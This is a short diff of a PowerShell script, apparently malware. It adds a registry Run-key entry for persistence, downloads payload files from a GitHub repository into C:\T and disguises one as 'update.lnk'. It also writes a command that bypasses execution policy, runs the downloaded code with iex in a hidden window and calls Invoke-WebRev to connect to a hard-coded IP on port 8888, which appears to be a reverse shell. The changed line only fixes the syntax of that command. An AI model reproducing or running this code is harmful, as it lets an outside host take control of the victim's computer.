@@ -5,7 +5,7 @@ New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Na
 wget https://raw.githubusercontent.com/licheng10203040-cloud/1/refs/heads/main/r -o C:\T\r;
 wget https://raw.githubusercontent.com/licheng10203040-cloud/1/refs/heads/main/m.ps1 -o C:\T\m.ps1;
 wget https://github.com/licheng10203040-cloud/1/raw/refs/heads/main/lnk -o C:\T\update.lnk;
-echo '!powershell "!powershell "-ExecutionPolicy Bypass -w 1 import-module C:\T\m.ps1;iex(Get-Content C:\T\r);Invoke-WebRev -ip 146.190.110.91 -port 8888"' > C:\T\1;
+echo '!powershell "-ExecutionPolicy Bypass -w 1 import-module C:\T\m.ps1;iex(Get-Content C:\T\r);Invoke-WebRev -ip 146.190.110.91 -port 8888"' > C:\T\1;
 exit
 
 
